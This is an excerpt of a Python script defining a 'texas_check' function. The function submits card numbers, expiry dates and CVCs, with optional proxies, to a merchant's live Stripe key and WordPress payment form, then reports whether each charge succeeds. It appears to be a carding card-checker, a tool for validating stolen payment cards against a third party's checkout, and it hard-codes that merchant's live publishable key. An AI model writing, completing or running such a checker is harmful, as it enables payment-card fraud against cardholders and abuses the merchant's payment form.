...
STRIPE_PK = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'


def texas_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy: dict = None) -> Tuple[str, bool]:
    """
    ...
    try:
        ...
        data = f'type=card&billing_details[name]={quote_plus(name)}&card[number]={card_num}&card[cvc]={card_cvc}&card[exp_month]={card_mon}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={STRIPE_PK}'
        ...
        data = {
            ...
            'wpfs-billing-name': name,
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': address,
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': city,
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': state,
            'wpfs-billing-address-zip': postal,
        ...
        print(f"[DEBUG] Texas response: status={response.status_code}, success={success_flag}, result={result[:200] if len(str(result)) > 200 else result}")
